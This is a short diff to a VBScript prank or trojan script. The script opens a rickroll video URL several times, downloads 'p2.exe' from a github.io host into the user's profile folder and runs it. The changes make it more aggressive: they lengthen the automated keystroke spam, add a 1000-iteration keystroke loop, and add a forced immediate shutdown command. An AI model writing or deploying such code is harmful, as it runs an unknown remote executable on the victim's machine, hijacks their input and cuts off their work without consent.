@@ -63,13 +63,17 @@ WScript.Sleep(500)
 For i = 1 To 3
 	objShell.Run "https://shattereddisk.github.io/rickroll/rickroll.mp4"
 Next
-For i = 1 To 50
+For i = 1 To 300
 	WScript.Sleep(15)
 	objShell.SendKeys("¯")
 Next
-WScript.Sleep(4000)
 fileName = "p2.exe"
 filePath = fso.BuildPath(profilePath, fileName)
 If Not DownloadAndRunAsync("https://stelios333.github.io/e/p2.exe", filePath) Then
     WScript.Echo "Something went wrong."
 End If
+For i = 1 To 1000 
+	WScript.Sleep(15)
+	objShell.SendKeys("¯")
+Next
+objShell.Run "shutdown /s /t 0", 1, False
